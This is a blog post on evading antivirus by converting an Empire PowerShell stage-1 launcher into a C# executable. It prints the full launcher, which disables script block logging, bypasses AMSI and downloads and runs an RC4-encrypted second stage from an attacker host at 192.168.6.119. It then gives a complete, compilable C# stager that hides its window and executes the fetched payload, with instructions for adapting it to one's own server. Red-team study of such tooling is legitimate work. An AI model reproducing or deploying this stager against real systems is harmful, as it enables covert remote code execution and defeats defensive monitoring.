---
title: AV Evasion Converting PowerEmpire Stage 1 to CSharp.
classes: wide
---

Español [aquí](/AV-Evasion-Converting-PowerEmpire-Stage-1-to-CSharp-ES/)

How can I run PowerEmpire using a .exe instead of a PowerShell command? I asked myself this question and decided to look what the PowerShell Empire command does and replicated it in C#.
 
As we all know PowerShell can use .Net classes, which make PowerShell a strong script language. This is one of the reasons Defenders and Attackers start using PowerShell. Some of the most popular Offensive PowerShell tools are [BloodHound](https://github.com/BloodHoundAD/BloodHound), [PowerEmpire](https://github.com/EmpireProject/Empire), [PowerSploit](https://github.com/PowerShellMafia/PowerSploit), [Nishang tools](https://github.com/samratashok/nishang) to mention a few. 
 
Because PowerShell it’s been heavily used by attackers, Microsoft started to introduce some security controls which allow to monitor PowerShell more closely. 
 
So, let's start with the PowerEmpire Launcher analysis. First, what is PowerShell Empire? It is a Post-Exploitation framework which use PowerShell and cryptologically-secure communications, if you need more information about this project, visit [www.powershellempire.com](www.powershellempire.com). 
 
PowerEmpire has many stages which you can use to launch your attack, for windows it includes dll, macro, hta, bat, vbs, shellcode, etc. So why did I decide to create a C# code for Empire if there is already one? Well let's said that I wanted to understand what Empire does, how it does it and I was wondering if can create my own code.
 
This is how you generate a Launcher:

![pse_launcher](/assets/images/pse_launcher.png)

This is the base64 script decoded:

```
If($PSVErSioNTaBLe.PSVErSIoN.MAjor -gE 3){$GPF=[rEf].AsSeMblY.GetTYpE('System.Management.Automation.Utils')."GeTFie`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');If($GPF){$GPC=$GPF.GeTValUE($NULL);IF($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$Val=[ColLECTionS.GENeric.DIcTiOnarY[STriNG,SystEm.Object]]::NEw();$vAL.ADD('EnableScriptB'+'lockLogging',0);$VAL.AdD('EnableScriptBlockInvocationLogging',0);$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$vAL}ElSe{[ScRIPtBloCk]."GETFIE`lD"('signatures','N'+'onPublic,Static').SetVALUe($nuLl,(New-OBJect COllEcTIONs.GenErIC.HASHSet[sTRInG]))}[REF].AsSEMBLY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeld('amsiInitFailed','NonPublic,Static').SETVALUe($null,$true)};};[SystEM.NeT.SErvicEPOINTManAGeR]::EXPeCt100CoNTinUe=0;$wC=New-ObJecT SYsTem.NET.WeBCLIENt;$u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';$WC.HEaDERS.ADd('User-Agent',$u);$wC.PRoxY=[SYsteM.NET.WEbRequest]::DeFAulTWEbPROxY;$wC.Proxy.CREdentIaLs = [SyStEM.NEt.CReDenTiaLCACHE]::DefAultNEtWorkCReDEntiALs;$Script:Proxy = $wc.Proxy;$K=[SYsTEm.TEXT.ENcODinG]::ASCII.GeTBYtEs('fdcece0a22c10f83dccc8f17c95a33d4');$R={$D,$K=$ARGs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}};$ser='http://192.168.6.119:80';$t='/CWoNaJLBo/VTNeWw11212/';$wc.HeADeRs.AdD("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");$Wc.HeaDeRs.Add("Accept-Language","en-en");$WC.HEADErS.AdD("Cookie","session=pRWdj48/Lf2wTAhO2Y7BXpRHz6o=");$DAtA=$WC.DOWnlOADDAtA($SEr+$T);$iv=$datA[0..3];$Data=$DATa[4..$DATA.LENgTh];-jOiN[ChaR[]](& $R $Data ($IV+$K))|IEX
```

This is the same script, but I removed some obfuscation to get a better view:
 
```
If($PSVErSioNTaBLe.PSVErSIoN.MAjor -gE 3)
{
	$GPF=[rEf].AsSeMblY.GetTYpE('System.Management.Automation.Utils')."GeTFieLd"('cachedGroupPolicySettings','NonPublic,Static');
	If($GPF)
	{
		$GPC=$GPF.GeTValUE($NULL);
		IF($GPC['ScriptBlockLogging'])
		{
			$GPC['ScriptBlockLogging']['EnableScriptBlockLogging']=0;
			$GPC['ScriptBlockLogging']['EnableScriptBlockInvocationLogging']=0
		}
		$Val=[ColLECTionS.GENeric.DIcTiOnarY[STriNG,SystEm.Object]]::NEw();
		$vAL.ADD('EnableScriptBlockLogging',0);
		$VAL.AdD('EnableScriptBlockInvocationLogging',0);
		$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']=$vAL
	}
	ElSe
	{
		[ScRIPtBloCk]."GETFIElD"('signatures','NonPublic,Static').SetVALUe($nuLl,(New-OBJect COllEcTIONs.GenErIC.HASHSet[sTRInG]))
	}
	[REF].AsSEMBLY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeld('amsiInitFailed','NonPublic,Static').SETVALUe($null,$true)};
};
[SystEM.NeT.SErvicEPOINTManAGeR]::EXPeCt100CoNTinUe=0;
$wC=New-ObJecT SYsTem.NET.WeBCLIENt;
$u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';
$WC.HEaDERS.ADd('User-Agent',$u);
$wC.PRoxY=[SYsteM.NET.WEbRequest]::DeFAulTWEbPROxY;
$wC.Proxy.CREdentIaLs = [SyStEM.NEt.CReDenTiaLCACHE]::DefAultNEtWorkCReDEntiALs;
$Script:Proxy = $wc.Proxy;
$K=[SYsTEm.TEXT.ENcODinG]::ASCII.GeTBYtEs('fdcece0a22c10f83dccc8f17c95a33d4');
$R={$D,$K=$ARGs;
$S=0..255;
0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;
$S[$_],$S[$J]=$S[$J],$S[$_]};
$D|%{$I=($I+1)%256;
$H=($H+$S[$I])%256;
$S[$I],$S[$H]=$S[$H],$S[$I];
$_-bXOr$S[($S[$I]+$S[$H])%256]}};
$ser='http://192.168.6.119:80';
$t='/CWoNaJLBo/VTNeWw11212/';
$wc.HeADeRs.AdD("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");
$Wc.HeaDeRs.Add("Accept-Language","en-en");
$WC.HEADErS.AdD("Cookie","session=pRWdj48/Lf2wTAhO2Y7BXpRHz6o=");
$DAtA=$WC.DOWnlOADDAtA($SEr+$T);
$iv=$datA[0..3];
$Data=$DATa[4..$DATA.LENgTh];
-jOiN[ChaR[]](& $R $Data ($IV+$K))|IEX
```

Next let's remove the IF part, for simplification, and focus on the rest of the code, I also organized it a little bit, so we can group the parts that work together and explain each one separately.
 
```
[System.Net.ServicePointManager]::Expect100Continue=0;
 
$wc=New-Object System.Net.WebClient;
$u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';
$wc.Headers.Add('User-Agent',$u);
$wc.Headers.Add("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");
$wc.Headers.Add("Accept-Language","en-en");
$wc.Headers.Add("Cookie","session=pRWdj48/Lf2wTAhO2Y7BXpRHz6o=");
 
$wc.PRoxY=[System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;
 
$ser='http://192.168.6.119:80';
$t='/CWoNaJLBo/VTNeWw11212/';
$data=$wc.DownloadData($ser+$t);
 
$K=[System.Text.Encoding]::ASCII.GetBytes('fdcece0a22c10f83dccc8f17c95a33d4');
$iv=$data[0..3];
$data=$data[4..$data.Length];
 
$R={$D,$K=$ARGs;
$S=0..255;
0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;
$S[$_],$S[$J]=$S[$J],$S[$_]};
$D|%{$I=($I+1)%256;
$H=($H+$S[$I])%256;
$S[$I],$S[$H]=$S[$H],$S[$I];
$_-bXOr$S[($S[$I]+$S[$H])%256]}};
 
-Join[Char[]](& $R $data ($IV+$K))|IEX
```

Now we need to convert each part of this code into C#. I enjoyed a lot learning some .Net classes while doing this research. Let's start line by line.
 
# From PowerShell to C#.
 
The **System.Net.ServicePointManager.Expect100Continue** in simple words, this property if true, the client requests that use the PUT and POST methods will add an Expect header to the request. For more information check the [link](https://msdn.microsoft.com/en-us/library/system.net.servicepointmanager.expect100continue(v=vs.110).aspx)
 
```
# PowerShell avoid sending Expect 100 Header 
[System.Net.ServicePointManager]::Expect100Continue=0;
 
// C# avoid sending Expect 100 Header 
System.Net.ServicePointManager.Expect100Continue = false;
```

# Server Connection
 
Next point we have is the **Web.Client** object, we use it to communicate with the Empire Server which is hosting the 2nd stage. 
 
Basically the 1st stage is responsible for creating a connection to the attacker machine and execute in memory the 2nd part of the payload (which is usually bigger), this is the 2nd stage. Sometimes are reference as stage0 and stage1. If you want to know more about stage and stageless payload you can check this [Metasploit documentation](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/).
 
The **Web.Client** object include all pieces of to perform web communication. In case the target is using proxy to communicate to other networks, the **DefaultWebProxy** and **DefaultNetworkCredentials** properties are used to provide Authentication and connection through Proxy Server, if necessary. I didn't convert the proxy part of the code, it was not necessary for my investigation, is up to you to convert it if you need it.
 
```
# PowerShell Create WebClient Object
$wc=New-Object System.Net.WebClient;
$u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';
$wc.Headers.Add('User-Agent',$u);
$wc.Headers.Add("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");
$wc.Headers.Add("Accept-Language","en-en");
$wc.Headers.Add("Cookie","session=pRWdj48/Lf2wTAhO2Y7BXpRHz6o=");
 
# PowerShell Use Default Web Proxy if Enabled
$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;
 
// C# Create a WebClient Object
WebClient wc = new WebClient();
string ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
wc.Headers["User-Agent"] = ua;
wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
```

Then we need to specify the server address, port and the target location, in our case this is the full URL http://192.168.6.119:80/CWoNaJLBo/VTNeWw11212/. After that, we call the DownloadData method from the Web.Client class to save the data in the $data variable. If you are curious about the data (2nd stage payload) is usually located in /opt/Empire/data/agent/stagers/http.ps1.
 
```
# PoweShell Set Server Address and Download the data.
$ser='http://192.168.6.119:80';
$t='/CWoNaJLBo/VTNeWw11212/';
$data=$wc.DownloadData($ser+$t); # Download
 
// C# Set Server Address and Download the data.
string server = "http://192.168.6.119:8081";
string target = "/CWoNaJLBo/VTNeWw11212/";
byte[] data = wc.DownloadData(server + target); // Download
```

# Cryptologically Secure Communication 
 
Once of the best things about Empire, and why is so hard for IPS to detect, is that it cryptologically secure the communication by using RC4 stream cipher. Harmj0y, one of the contributors to PowerEmpire, created a blog post about RC4 implementation in PowerShell, I invite you to read about it in his [post](https://www.harmj0y.net/blog/powershell/powershell-rc4/)
 
For **RC4** to work we'll need 3 pieces the **Key ($K)**, a **Random Value (referred as $IV)** and the **data (stage 2)**. 
 
The **Key** is generated when you execute your launcher, in PowerEmpire is called **StagingKey**. 

![pse_stagingkey](/assets/images/pse_stagingkey.png)
 
```
// PowerShell Key Value for Decryption
$K=[System.Text.Encoding]::ASCII.GetBytes('fdcece0a22c10f83dccc8f17c95a33d4');
 
// C# Key value for decryption
string key = "fdcece0a22c10f83dccc8f17c95a33d4";
byte[] K = Encoding.ASCII.GetBytes(key);
```

The **IV** is a random value that we got from the data (2nd stage) we downloaded, that value are the first 4 bytes of the data array. The IV is responsible for making the Empire Communication random each time it downloads the 2nd stage.
 
```
// PowerShell Extract IV from data
$iv=$data[0..3];
 
// C# Extract IV from data
byte[] iv = data.Take(4).Select(i => i).ToArray();
```

Finally, we remove the IV from the data, because those are not data just that random value:

```
// PowerShell Remove IV from data
$data=$data[4..$data.Length];
 
// C# Remove the IV from the data
byte[] data_noIV = data.Skip(4).ToArray();
```

# RC4 Encryption
 
This is where all the magic happen, if you clicked the link about Harm0jy blog post about RC4 you'll understand what this piece of code is, this is the minimization of RC4 implementation for decrypting, or executing, malware communications. For C# I found 2 RC4 classes which I just copied and paste, the one I used in the code was created by Jeong ChangWook, here his [source](https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4)
 
```
// PowerShell RC4 function to decrypt the stage 2 data.
$R={$D,$K=$ARGs;
$S=0..255;
0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;
$S[$_],$S[$J]=$S[$J],$S[$_]};
$D|%{$I=($I+1)%256;
$H=($H+$S[$I])%256;
$S[$I],$S[$H]=$S[$H],$S[$I];
$_-bXOr$S[($S[$I]+$S[$H])%256]}};
 
// C# RC4 Class to decrypt the stage 2 data
// Created by Jeong ChangWook. Source https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
public class RC4
{
	public static byte[] Encrypt(byte[] pwd, byte[] data)
	{
		int a, i, j, k, tmp;
		int[] key, box;
		byte[] cipher;

		key = new int[256];
		box = new int[256];
		cipher = new byte[data.Length];

		for (i = 0; i < 256; i++)
		{
			key[i] = pwd[i % pwd.Length];
			box[i] = i;
		}
		for (j = i = 0; i < 256; i++)
		{
			j = (j + box[i] + key[i]) % 256;
			tmp = box[i];
			box[i] = box[j];
			box[j] = tmp;
		}
		for (a = j = i = 0; i < data.Length; i++)
		{
			a++;
			a %= 256;
			j += box[a];
			j %= 256;
			tmp = box[a];
			box[a] = box[j];
			box[j] = tmp;
			k = box[((box[a] + box[j]) % 256)];
			cipher[i] = (byte)(data[i] ^ k);
		}
		return cipher;
	}

	public static byte[] Decrypt(byte[] pwd, byte[] data)
	{
		return Encrypt(pwd, data);
	}
}
```

The last part is responsible for joining everything together. We can divide the Join in 2 pieces, the 1st one is the RC4 decryption part which use the $R minimization script, the data as argument and the combination of the IV + K as the decrypt value. You can execute  **& $R $data ($IV+$K)** alone so you can see the RC4 in action, and then Join all to finally Invoke-Execution (IEX).

```
//PowerShell Code
-Join[Char[]](& $R $data ($IV+$K))|IEX
 
// C# Code
// Combine the IV + Key (New random key each time)
byte[] IVK = new byte[iv.Length + K.Length];
iv.CopyTo(IVK, 0);
K.CopyTo(IVK, iv.Length);
 
// Decrypt the Message
byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
 
// Convert the stage2 decrypted message from bytes to ASCII
string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
```

# C# Execution
 
To execute code in C# we can use the PowerShell class or the RunSpace and Pipeline classes, this is because the stage 2 payload is in PowerShell. We'll use PowerShell class because for some reasons RunSpace and Pipeline classes didn't work for me. In PowerShell we execute using Invoke-Execution or IEX.

```
// Create a PowerShell Object to execute the command 
PowerShell PowerShellInstance = PowerShell.Create();
 
// Add the Script Stage 2 to the Powershell Object
PowerShellInstance.AddScript(stage2);
 
// Execute the Script!
PowerShellInstance.Invoke();
```

Before we use the Invoke() method, we need to add two variables to the equation, those are $ser and $u. If you look at the stage2 string, you'll notice that it executes a function call for **Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u** so, we need to pass the $ser and $u variables to get execution, otherwise we would get an error.

```
// Create the variables $ser and $u which are part of the downloaded stage2
PowerShellInstance.Runspace.SessionStateProxy.SetVariable("ser", server);
PowerShellInstance.Runspace.SessionStateProxy.SetVariable("u", ua);
```

Finally, I added some extra functions to hide the cmd window, you will find information about then in the comments. Now let's put the C# code all together and execute our C# empire payload. The final code should look like:

``` 
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
 
namespace PSEmpire_Stage1
{
    class Program
    {
        // RC4 Class to decrypt the stage 2 data
        // Created by Jeong ChangWook. Source https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
        public class RC4
        {
            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;
 
                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];
 
                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }
 
            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }
 
        }
 
        // Hide Windows function by our friends from StackOverFlow
        // https://stackoverflow.com/questions/34440916/hide-the-console-window-from-a-console-application
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
 
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
        static void Main(string[] args)
        {
            // To Hide the ConsoleWindow (It may be a better way...)
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
 
            // Avoid sending Expect 100 Header 
            System.Net.ServicePointManager.Expect100Continue = false;
 
            // Create a WebClient Object (No Proxy Support Included)
            WebClient wc = new WebClient();
            string ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            wc.Headers["User-Agent"] = ua;
            wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
 
            // Set the Server Address and URL 
            string server = "http://192.168.6.119:8081";
            string target = "/CWoNaJLBo/VTNeWw11212/";
 
            // Download The Data or Stage 2
            byte[] data = wc.DownloadData(server + target);
 
            // Extract IV
            byte[] iv = data.Take(4).Select(i => i).ToArray();
 
            // Remove the IV from the data
            byte[] data_noIV = data.Skip(4).ToArray();
 
            // Set Key value for decryption. PowerEmpire StageingKey value 
            string key = "fdcece0a22c10f83dccc8f17c95a33d4";
            byte[] K = Encoding.ASCII.GetBytes(key);
 
            // Combine the IV + Key (New random key each time)
            byte[] IVK = new byte[iv.Length + K.Length];
            iv.CopyTo(IVK, 0);
            K.CopyTo(IVK, iv.Length);
 
            // Decrypt the Message
            byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
 
            // Convert the stage2 decrypted message from bytes to ASCII
            string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
 
            // Create a PowerShell Object to execute the command 
            PowerShell PowerShellInstance = PowerShell.Create();
 
            // Create the variables $ser and $u which are part of the downloaded stage2
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("ser", server);
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("u", ua);
 
            // Add the Script Stage 2 to the Powershell Object
            PowerShellInstance.AddScript(stage2);
 
            // Execute the Script!
            PowerShellInstance.Invoke();
 
        }
    }
}
```
# Ajust the Code for your Empire.

If you want to test it, you just need to modify this code to include your variables, you need to change **Key**, **server**, **target** and **cookie** variables. If you don't know what are yours, just execute launcher command (launcher powershell <Launcher Name>), use **base64 -d** to decode your script and check those values.

To compile you can use csc.exe, and reference the System.Management.Automation.dll. Example: Save your code in PSEmpireStage1.cs and use the Developer Command Prompt.

``` 
csc.exe PSEmpireStage1.cs /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
```

The easy way to get it working, is just take a look at this video :) 

{% include video id="0jaC8156BEE" provider="youtube" %}
 
There's a lot more to discover for PowerShell Empire, but for me this was a good start. I have been using PowerEmpire for almost 6 months and I didn't know all this stuff.
 
The project is in my [GitHub](https://github.com/juliourena/plaintext/blob/master/PowerEmpire/PSEmpireStage1.cs).

**God bless you!**

**Serving Christ is not a task, but a relationship. Friends of God. Jn 15:15**
 
 
 

